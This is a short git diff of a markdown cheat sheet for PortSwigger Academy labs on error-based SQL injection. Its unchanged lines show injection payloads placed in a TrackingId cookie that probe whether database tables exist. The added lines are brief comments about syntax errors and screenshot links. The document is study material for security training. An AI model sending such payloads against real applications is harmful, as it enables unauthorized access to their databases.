@@ -34,7 +34,13 @@ Cookie: TrackingId=S0DitPIzii7Vv0TT'  --> put ' at the end of the cookies.
  '||(SELECT '' FROM not-a-real-table)||'   -> if returns error, table does not exist.
  '||(SELECT '' FROM users WHERE ROWNUM = 1)||'  -> -> if does not returns error, table exist.
 
+the syntax is correct and we get no error.
 <img width="743" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/f7d1686a-e4c7-45c4-92dd-746d5d26be70">
+
+its not a syntax error, its syntactical error.
+<img width="734" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/ee8790ee-3f75-4be0-a5d0-27e0a695cb7b">
+
+
 
 
  
